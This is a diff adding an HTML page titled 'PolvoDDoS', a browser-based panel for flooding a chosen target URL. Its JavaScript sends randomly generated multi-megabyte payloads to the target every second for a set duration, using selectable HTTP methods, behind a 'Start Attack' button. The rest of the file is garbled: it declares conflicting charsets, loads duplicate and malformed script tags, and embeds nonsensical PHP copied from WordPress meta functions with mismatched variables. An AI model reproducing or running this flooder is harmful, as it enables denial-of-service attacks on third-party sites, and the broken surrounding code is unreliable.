@@ -1,0 +1,319 @@
+    <!DOCTYPE html>
+
+    <html>
+
+    <head>
+
+    <title>PolvoDDoS</title>
+
+    <meta charset="UTF-8" />
+    <meta charset="UTF-16" />
+    <meta charset="UTF-16BE" />
+    <meta charset="UTF-16LE" />
+    <meta charset="UTF-32" />
+    <meta charset="UTF-32BE" />
+    <meta charset="UTF-32LE" />
+    <meta name="viewport" id="viewport" content="width=device-width, initial-scale=1"> 
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" />
+    <link rel="stylesheet" href="https://releases.jquery.com/git/mobile/git/jquery.mobile-git.css" />
+    <link rel="stylesheet" href="https://code.jquery.com/qunit/qunit-2.24.3.css" />
+   
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.4/dist/jquery.slim.min.js"> </script>
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6/dist/jquery.min.js"> </script>
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"> </script>
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.4/src/core.min.js"> </script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"> </script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"> </script>
+    <script src="https://cdn.jsdelivr.net/gh/jquery/jquery@3.6.4/dist/jquery.min.js"> </script>
+    <script src="https://cdn.jsdelivr.net/gh/jquery/jquery@3.6/dist/jquery.min.js"> </script>
+    <script src="https://cdn.jsdelivr.net/gh/jquery/jquery@3/dist/jquery.min.js"> </script>
+    <script src="https://cdn.jsdelivr.net/gh/jquery/jquery@3.6.4/src/core.min.js"> </script>
+    <script src="https://releases.jquery.com/git/mobile/git/jquery.mobile-git.j"s> </script>
+    <script src="https://code.jquery.com/qunit/qunit-2.24.3.js"> </script>
+
+    <style>
+
+        .progress-bar::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 2px;
+            background-color: rgba(255, 255, 255, 0.75);
+        }
+
+    </style>
+
+</head>
+
+<body class="bg-dark" style="overflow: hidden;">
+<div class="container mt-5">
+    <div class="row">
+        <div class="col-md-12">
+            <div class="card border-primary">
+                <div class="card-header bg-primary text-light">
+                    PolcoDDoS Panel
+                </div>
+
+                <div class="card-body">
+                    Target:
+                    <input type="text" class="form-control" id="target" placeholder="https://www.youtube.com/" /><br />
+
+                    <div class="row">
+                        <div class="col-6">
+                            Method:
+                            <select id="method" class="form-control">
+                                <option value="HEAD">HEAD</option>
+                                <option value="JSON">JSON</option>
+                                <option value="DIALOG">DIALOG</option>
+                                <option value="GET">GET</option>
+                                <option value="POST">POST</option>
+                                <option value="PUT">PUT</option>
+                                <option value="OPTION">OPTION</option>
+                                <option value="TRACE">TRACE</option>
+                                <option value="PATCH">PATCH</option>
+                                <option value="CONNECT">CONNECT</option>
+                                <option value="DELETE">DELETE</option>
+                            </select>
+                        </div>
+
+                        <div class="col-6">
+                            Packet size (MB):
+                            <input type="number" value="1" class="form-control" id="size" />
+                        </div>
+                    </div><br />
+
+                    Duration (in seconds):
+                    <input type="number" value="10" class="form-control" id="duration" /><br />
+
+                    <button class="btn btn-success btn-block" id="attack">
+                        Start Attack
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="progress" style="height: 30px; display: none;">
+    <div id="progressBar" class="progress-bar bg-success" role="progressbar" style="width: 0%;" aria-valuenow="0"
+         aria-valuemin="0" aria-valuemax="100"></div>
+</div>
+
+    <script>
+
+    var DDOS_ATTACK = null;
+
+    function generateRandomPayload(sizeInMB) {
+        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+        const dataSize = sizeInMB * 1024 * 1024;
+
+        let payload = '';
+        for (let i = 0; i < dataSize; i++) {
+            payload += characters.charAt(Math.floor(Math.random() * characters.length));
+        }
+
+        return payload;
+    }
+
+    function attack(target, method = "HEAD", sizeInMB = 1, duration = 10) {
+        if (DDOS_ATTACK == null) {
+            $(".progress").show();
+
+            var startTime = Date.now();
+            var endTime = startTime + duration * 1000;
+            var progress = 0;
+
+            DDOS_ATTACK = setInterval(function () {
+                if (Date.now() > endTime) {
+                    clearInterval(DDOS_ATTACK);
+                    DDOS_ATTACK = null;
+                    $(".progress").hide();
+                    $("#progressBar").css("width", "0%");
+                    $("#attack").removeClass("btn-danger").addClass("btn-success").text("Start Attack");
+                    return;
+                }
+
+                var version = "";
+                var payload = generateRandomPayload(sizeInMB);
+
+                var x = new XMLHttpRequest();
+                x.open(method, target, true);
+                x.send(payload);
+
+                progress = ((Date.now() - startTime) / (endTime - startTime)) * 100;
+                $("#progressBar").css("width", progress + "%");
+                $("#progressBar").attr("aria-valuenow", progress);
+            }, 1000);
+        } else {
+            clearInterval(DDOS_ATTACK);
+            DDOS_ATTACK = null;
+            $(".progress").hide();
+            $("#progressBar").css("width", "0%");
+            $("#attack").removeClass("btn-danger").addClass("btn-success").text("Start Attack");
+        }
+    }
+
+    $("#attack").on("click", function () {
+        var target = $("#target").val();
+        var method = $("#method").val();
+        var sizeInMB = $("#size").val();
+        var duration = $("#duration").val();
+
+        if (target.length < 1) {
+            alert("Please enter target");
+            return;
+        }
+
+        if ($(this).hasClass("btn-success")) {
+            $(this).removeClass("btn-success").addClass("btn-danger").text("Stop Attack");
+            attack(target, method, sizeInMB, duration);
+        } else {
+            $(this).removeClass("btn-danger").addClass("btn-success").text("Start Attack");
+            clearInterval(DDOS_ATTACK);
+            DDOS_ATTACK = null;
+            $(".progress").hide();
+            $("#progressBar").css("width", "0%");
+        }
+    });
+
+</script>
+
+<script>
+	
+javascript:(function(){var b=document.getElementsByTagName('meta'),c=b.length,a;while(c--){a=b[c];if(a.name.toLowerCase()=='viewport'){a.parentNode.removeChild(a)}}})();
+	
+	(function() {
+    var metaElements = document.getElementsByTagName('meta'),
+        i            = metaElements.length,
+        el;
+    
+    while (i--) {
+        el = metaElements[i];
+        if (el.name.toLowerCase() == 'viewport') {
+            el.parentNode.removeChild(el);
+        }
+    }
+})();
+
+</script>
+
+    <?php
+
+function delete_dialog_meta( $dialog_id, $meta_key, $meta_value = '' ) {
+	
+	$the_dialog = wp_is_dialog_revision( $dialog_id );
+	if ( $the_dialog ) {
+		$dialog_id = $the_dialog;
+	}
+
+	return delete_metadata( 'dialog', $head_id, $meta_key, $meta_value );
+}
+
+function delete_json_meta( $json_id, $meta_key, $meta_value = '' ) {
+	
+	$the_json = wp_is_json_revision( $json_id );
+	if ( $the_json ) {
+		$json_id = $the_json;
+	}
+
+	return delete_metadata( 'json', $head_id, $meta_key, $meta_value );
+
+}
+
+function delete_head_meta( $head_id, $meta_key, $meta_value = '' ) {
+	
+	$the_head = wp_is_head_revision( $head_id );
+	if ( $the_head ) {
+		$head_id = $the_head;
+	}
+
+	return delete_metadata( 'head', $head_id, $meta_key, $meta_value );
+}
+
+function delete_get_meta( $get_id, $meta_key, $meta_value = '' ) {
+	
+	$the_get = wp_is_get_revision( $get_id );
+	if ( $the_get ) {
+		$get_id = $the_get;
+	}
+
+	return delete_metadata( 'get', $get_id, $meta_key, $meta_value );
+}
+
+function delete_put_meta( $head_id, $meta_key, $meta_value = '' ) {
+	
+	$the_put = wp_is_put_revision( $put_id );
+	if ( $the_put ) {
+		$put_id = $the_put;
+	}
+
+	return delete_metadata( 'put', $put_id, $meta_key, $meta_value );
+}
+
+function delete_connect_meta( $connect_id, $meta_key, $meta_value = '' ) {
+	
+	$the_connect = wp_is_connect_revision( $get_id );
+	if ( $the_connect ) {
+		$connect_id = $the_connect;
+	}
+
+	return delete_metadata( 'connect', $connect_id, $meta_key, $meta_value );
+}
+
+function delete_option_meta( $option_id, $meta_key, $meta_value = '' ) {
+	
+	$the_option = wp_is_option_revision( $option_id );
+	if ( $the_option ) {
+		$option_id = $the_option;
+	}
+
+	return delete_metadata( 'option', $option_id, $meta_key, $meta_value );
+}
+
+function delete_trace_meta( $trace_id, $meta_key, $meta_value = '' ) {
+	
+	$the_trace = wp_is_trace_revision( $trace_id );
+	if ( $the_trace ) {
+		$trace_id = $the_trace;
+	}
+
+	return delete_metadata( 'trace', $trace_id, $meta_key, $meta_value );
+}
+
+function delete_patch_meta( $patch_id, $meta_key, $meta_value = '' ) {
+	
+	$the_patch = wp_is_patch_revision( $patch_id );
+	if ( $the_patch ) {
+		$patch_id = $the_patch;
+	}
+
+	return delete_metadata( 'patch', $head_id, $meta_key, $meta_value );
+}
+
+function delete_delete_meta( $delete_id, $meta_key, $meta_value = '' ) {
+	
+	$the_delete = wp_is_delete_revision( $delete_id );
+	if ( $the_delete ) {
+		$delete_id = $the_delete;
+	}
+
+	return delete_metadata( 'delete', $delete_id, $meta_key, $meta_value );
+}
+
+function delete_post_meta( $post_id, $meta_key, $meta_value = '' ) {
+	
+	$the_post = wp_is_post_revision( $post_id );
+	if ( $the_post ) {
+		$post_id = $the_post;
+	}
+
+	return delete_metadata( 'post', $post_id, $meta_key, $meta_value );
+}
+
+?>
+	
+</body>
+
+</html>
